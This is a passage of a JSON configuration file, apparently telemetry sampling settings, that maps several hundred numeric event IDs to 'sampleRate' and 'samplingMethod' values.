								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377367763": {
								"sampleRate": 5,
								"samplingMethod": 1
							},
							"377369626": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377370025": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377370051": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377370203": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377370433": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377371065": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377371646": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377817277": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377828343": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"380895233": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"382140417": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"382140418": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"382144536": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"382151174": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"382468096": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"382468097": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"382468098": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"382468099": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"382482261": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"383977073": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"383981122": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"383981950": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"383982589": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"383984277": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"383984867": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"383988238": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"383988475": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"383988898": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"383990784": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"390269683": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"390274320": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"390275150": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"390276342": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"390276625": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"390279467": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"390280883": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"390281220": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"390281974": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"392106711": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"392107390": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"392115811": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"392966766": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"394788865": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"398592899": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"398601326": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"398605840": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"398983169": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"399182973": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399185036": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399185894": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399185985": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399186794": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399187008": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399188160": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399190027": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399191513": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399191697": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399191926": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399192359": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399193700": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399194693": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399194700": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399194972": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"399195628": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"403271918": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"404622304": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"404626521": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"404626709": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"404630839": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"404631825": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"404632630": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"406978561": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"406980340": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"406983321": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"409677744": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"412818996": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"412821821": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"416876920": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"416877160": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"416880118": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"416880668": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"416883138": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"416884823": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"416888659": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"416890732": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"426382631": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"426385027": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"426389483": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"430374913": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"430378067": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"430383451": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"430386496": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"430390878": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"430391177": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"431626192": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"431626709": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"431630887": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"432676234": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"432676659": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"432677504": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"432679263": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"432682775": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"432683819": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"435684623": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435684729": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435684741": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435684980": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435685229": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435685848": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435685921": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435686268": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435687015": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435687513": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435687530": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435687537": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435687801": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435688416": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435688603": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435688620": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435689044": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435689085": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435689154": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435689259": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435689828": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435689899": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435690518": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435691376": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435691707": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435691902": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435691955": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435692102": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435692121": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435692433": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"435692864": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435692975": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435693002": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435693404": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435693600": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435693854": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435694384": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435694627": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435694927": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435694934": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435696304": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435696437": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435696473": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"435696804": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435696833": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435697072": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435697446": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435697886": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435698374": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435698646": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435699123": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"435699279": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"440272387": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"440275195": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"440282660": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"444858369": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445974198": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445974335": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445975283": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445975868": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445976139": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445976232": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445977086": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445977908": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445978739": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445979308": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445981478": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445981521": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445981651": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445981782": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445982501": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445982831": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445983197": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445983323": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445983810": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445983882": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445984313": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445984511": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445984703": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445984855": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445985856": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445986130": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445986133": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445986387": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445986686": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445987236": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445988450": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445988500": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"445988600": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"448137847": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"448137862": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459277372": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459279083": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459280844": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459283386": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459283488": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459285749": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459288505": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459291249": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459292159": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"459292291": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"460468818": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"462694058": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"462696865": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"463013863": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463014635": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463015185": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463015362": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463015568": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463016139": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463016390": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463016713": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463016767": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463017909": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463018037": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463018233": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463018876": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463018880": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463018912": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463018943": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463019567": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463019600": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463019974": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463020161": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463020393": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463020766": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463021269": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463021570": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463021813": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463022004": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463022130": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463022146": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463022516": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463022924": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463023032": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463023080": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463023725": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463024020": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463024072": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463024364": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463024522": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463024556": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463024597": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463024743": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463025126": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463025650": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463025693": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463025949": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463026040": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463026246": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463026369": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463026593": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"463027530": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"463027792": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"469633012": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"469637892": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"469638517": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"469639633": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"469641443": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"469642697": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"469643296": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"478093416": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"478093695": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"478347265": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"480908390": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"480910975": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"480913460": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"480914164": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"480916396": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"484905239": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"491135209": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"491143074": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"508365154": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"508369126": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"509620182": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"509620851": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516228586": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516228710": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516229001": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516231801": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516233522": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516233736": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516234127": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516234250": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516234458": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516234851": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516234913": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516234920": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516234962": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516236532": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516237107": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516237754": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516239376": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516239513": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"516242024": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"517542031": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"517544033": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"517544500": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"517551506": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"519441307": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"520225911": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520225996": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520226562": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520226569": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520226739": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520226803": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520226859": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520227779": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520227859": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"520228803": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520228965": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520229252": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520230996": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520231860": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520231903": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520232512": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520232580": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520232917": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520233760": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520234221": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520234245": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520234604": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520234918": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520235130": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520235197": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520235824": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520236691": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520237146": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520239363": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"520239402": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520240619": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520240645": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"520240859": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"526517510": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526518298": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526518890": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526519344": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526521870": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526522103": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526525605": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526526321": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526526434": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526527396": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526532064": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"526714587": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"526717649": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"527765249": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"527769459": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"527771788": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"528230786": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"528233608": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"528235747": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"531301737": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"531312344": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"532156700": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"532161105": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"532162716": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"532165955": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"532167327": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"532885803": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"532886361": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"532888709": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"534971955": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"534974071": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"534977644": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"534978022": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"534979103": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"534979289": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"534983980": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"534984327": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"538512187": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"538522688": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"538523041": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"539298786": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"542776204": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"542778775": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"542784537": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"543626600": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"543628365": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"543632025": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"543633351": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"544671169": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544671925": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544672070": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544672144": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544672323": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544674848": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544677675": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544679016": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544679157": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544679355": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544679565": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544679875": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544680242": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544680711": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544681296": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544681905": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544683739": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544683999": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"544684042": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"553648129": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"553648130": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"553655735": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"553661671": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"558902195": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"558903169": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"558903412": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"558904351": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"558904495": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"558905116": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559090277": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559090485": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559093968": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559094585": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559096080": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559096538": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559096915": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559099845": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559100761": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559101881": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"559102417": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"572130828": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"572131972": {
								"sampleRate": 1,
								"samplingMethod": 1
